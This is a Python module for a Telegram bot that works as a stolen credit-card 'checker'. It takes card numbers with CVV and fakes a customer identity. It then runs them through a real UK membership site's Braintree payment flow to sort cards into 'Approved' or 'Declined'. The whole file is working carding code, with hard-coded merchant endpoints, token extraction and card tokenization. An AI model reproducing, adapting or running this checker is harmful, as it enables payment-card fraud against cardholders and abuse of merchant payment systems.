import time, base64, json, uuid
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
from src.extras.checklib import MakeGate, ScrapInfo

name_gate = "Braintree_auth"
subtype = "Braintree_auth"
command = "be"


@staticmethod
def braintree_generate_correlation_id():
    return str(uuid.uuid4())


@Client.on_message(
    filters.command([f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False)
)
async def gateway(client: Client, m: Message):
    card = (
        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    )
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = MakeGate(card).get_card_details()
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg)


async def get_live(card, msg):
    email = ScrapInfo().email_generator()
    web = ScrapInfo().session()

    current_time = datetime.now().strftime("%D - %H:%M:%S")

    card_split = MakeGate(card).get_card_details()
    ccn = card_split[0]
    month = card_split[1]
    year = card_split[2]
    if len(year) == 2:
        year = f"20{card_split[2]}"
    cvv = card_split[3]

    initial_time = time.time()
    data_bin = MakeGate(card).bin_lookup()
    proxy = web.proxies

    req = web.get("https://randomuser.me/api/1.2/?nat=US")
    first_name = req.text.split('"first":"')[1].split('"')[0]
    last_name = req.text.split('"last":"')[1].split('"')[0]
    gender = req.text.split('"gender":"')[1].split('"')[0]
    first_name = req.text.split('"first":"')[1].split('"')[0]
    last_name = req.text.split('"last":"')[1].split('"')[0]
    email = req.text.split('"email":"')[1].split('"')[0]
    phone = req.text.split('"phone":"')[1].split('"')[0]
    cell = req.text.split('"cell":"')[1].split('"')[0]
    city = req.text.split('"city":"')[1].split('"')[0]
    state = req.text.split('"state":"')[1].split('"')[0]
    postcode = req.text.split('"postcode":')[1].split(",")[0]
    street = req.text.split('"street":"')[1].split('"')[0]
    age = req.text.split('"age":')[1].split(",")[0]

    headers = {
        "accept": "*/*",
        "accept-language": "es-419,es;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "text/plain;charset=UTF-8",
        "origin": "https://www.managers.org.uk",
        "priority": "u=1, i",
        "referer": "https://www.managers.org.uk/",
        "sec-ch-ua": '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    data = json.dumps(
        {
            "oTitle": {"strTitle": "Mx"},
            "strFirstName": first_name,
            "strLastName": last_name,
            "oDOB": {"strDOB": ""},
            "oMobileNumber": {"strMobileNumber": phone},
            "oEmail": {
                "strEmail": email,
                "strConfirmEmail": "",
                "bLiteVersion": "true",
            },
            "oAddress": {
                "strPostcode": postcode,
                "strAddressLine1": street,
                "strAddressLine2": "",
                "strTown": city,
                "strCountry": "375",
                "strCountryTextValue": "United States of America",
            },
            "oPassword": {"strPassword": None, "strConfirmPassword": None},
            "strKey": "undefined",
            "strPromoCode": "",
            "bTermsAndConditions": True,
            "oDD": "undefined",
            "strProduct": "member",
            "strPlanId": "Affiliate-OLJN",
            "oBT": "undefined",
            "bOneOffPayment": "",
            "bUpgrade": False,
            "bFirstMonthTrialPeriodEnabled": False,
            "strRoute": "website",
            "bLiteVersion": True,
            "strCallAPIName": "submitFirstForm",
        }
    )

    req1 = web.post(
        "https://objects.managers.org.uk/objects/CMIWebObjectMicrositeRegisterMember/",
        headers=headers,
        data=data,
    )

    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {ccn}:{month}:{year}:{cvv}
<b>Status:</b> Checking...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""

    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    data = json.dumps(
        {
            "strTitle": "Mx",
            "strFirstName": first_name,
            "strLastName": last_name,
            "strEmail": email,
            "strMemberCode": "P05184221",
            "strUserToken": "undefined",
            "strCardholderName": f"{first_name} {last_name}",
            "strAddressLine1": street,
            "strAddressLine2": "",
            "strTown": city,
            "strCountry": "United States of America",
            "strPostcode": postcode,
            "strPlanId": "Affiliate-OLJN",
            "strAmount": "15.00",
            "strPromoCode": "",
            "strPromoCodeAmount": "",
            "bMultipleSubscription": "undefined",
            "strCallAPIName": "getClientToken",
        }
    )

    req2 = web.post(
        "https://objects.managers.org.uk/objects/CMIWebObjectPayment/",
        headers=headers,
        data=data,
    )

    clientoken = req2.json()["strClientToken"]
    B64_ = base64.b64decode(clientoken)
    finger = json.loads(B64_)["authorizationFingerprint"]

    headers = {
        "accept": "*/*",
        "accept-language": "es-419,es;q=0.9",
        "authorization": "Bearer " + finger,
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://www.managers.org.uk",
        "priority": "u=1, i",
        "referer": "https://www.managers.org.uk/",
        "sec-ch-ua": '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    json_data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": braintree_generate_correlation_id(),
        },
        "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
        "operationName": "ClientConfiguration",
    }

    req3 = web.post(
        "https://payments.braintree-api.com/graphql", headers=headers, json=json_data
    )

    headers = {
        "accept": "*/*",
        "accept-language": "es-419,es;q=0.9",
        "authorization": "Bearer " + finger,
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "priority": "u=1, i",
        "referer": "https://assets.braintreegateway.com/",
        "sec-ch-ua": '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    json_data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin2",
            "sessionId": braintree_generate_correlation_id(),
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": ccn,
                    "expirationMonth": month,
                    "expirationYear": year,
                    "cvv": cvv,
                    "cardholderName": f"{first_name} {last_name}",
                    "billingAddress": {
                        "postalCode": postcode,
                    },
                },
                "options": {
                    "validate": False,
                },
            },
        },
        "operationName": "TokenizeCreditCard",
    }

    req4 = web.post(
        "https://payments.braintree-api.com/graphql", headers=headers, json=json_data
    )
    tokencc = req4.json()["data"]["tokenizeCreditCard"]["token"]

    headers = {
        "accept": "*/*",
        "accept-language": "es-419,es;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "text/plain;charset=UTF-8",
        "origin": "https://www.managers.org.uk",
        "priority": "u=1, i",
        "referer": "https://www.managers.org.uk/",
        "sec-ch-ua": '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }

    data = json.dumps(
        {
            "strTitle": "Mx",
            "strFirstName": first_name,
            "strLastName": last_name,
            "strEmail": email,
            "strMemberCode": "P05184221",
            "strUserToken": "undefined",
            "strCardholderName": f"{first_name} {last_name}",
            "strAddressLine1": street,
            "strAddressLine2": "",
            "strTown": city,
            "strCountry": "United States of America",
            "strPostcode": postcode,
            "strPlanId": "Affiliate-OLJN",
            "strAmount": "15.00",
            "strPromoCode": "",
            "strPromoCodeAmount": "",
            "bMultipleSubscription": "undefined",
            "strCallAPIName": "createCustomer",
            "oPaymentMethod": {
                "nonce": tokencc,
                "details": {
                    "cardholderName": "Mx sadasd sadad",
                    "expirationMonth": "05",
                    "expirationYear": month,
                    "bin": ccn[:6],
                    "cardType": "MASTERCARD",
                    "lastFour": ccn[-4:],
                    "lastTwo": cvv[-2:],
                },
                "type": "CreditCard",
                "description": "ending in 19",
                "binData": {
                    "prepaid": "No",
                    "healthcare": "No",
                    "debit": "Yes",
                    "durbinRegulated": "No",
                    "commercial": "Unknown",
                    "payroll": "No",
                    "issuingBank": "BANCO DAVIVIENDA, S.A.",
                    "countryOfIssuance": "COL",
                    "productId": "MDS",
                },
            },
            "strCustomerId": "",
        }
    )

    req5 = web.post(
        "https://objects.managers.org.uk/objects/CMIWebObjectPayment/",
        headers=headers,
        content=data,
    )

    response_json = req5.json()
    try:
        if (
            "strMessage" in response_json
            and response_json["strMessage"] == "Gateway Rejected: risk_threshold"
        ):
            status = "Declined ❌"
            processor_code = "Gateway Rejected"
            processor_text = "Risk Threshold"
            cvv_code = "None"
            avs_postal = "None"
            avs_street = "None"
            network_code = "None"
            network_text = "None"
        else:
            verification = response_json["oResult"]["verification"]
            processor_code = verification.get("processorResponseCode", "None")
            processor_text = verification.get("processorResponseText", "None")
            cvv_code = verification.get("cvvResponseCode", "None")
            avs_postal = verification.get("avsPostalCodeResponseCode", "None")
            avs_street = verification.get("avsStreetAddressResponseCode", "None")
            network_code = verification.get("networkResponseCode", "None")
            network_text = verification.get("networkResponseText", "None")
    except:
        processor_code = "None"
        processor_text = "None"
        cvv_code = "None"
        avs_postal = "None"
        avs_street = "None"
        network_code = "None"
        network_text = "None"

    if "1000" in processor_code:
        status = "Approved ✅"
    elif "2001" in processor_code:
        status = "Approved ✅"
    elif "2010" in processor_code:
        status = "Approved ✅"
    elif "avs" in processor_text:
        status = "Approved ✅"
    else:
        status = "Declined ❌"

    card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {status}<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {processor_text}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
    await msg.edit_text(
        card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )
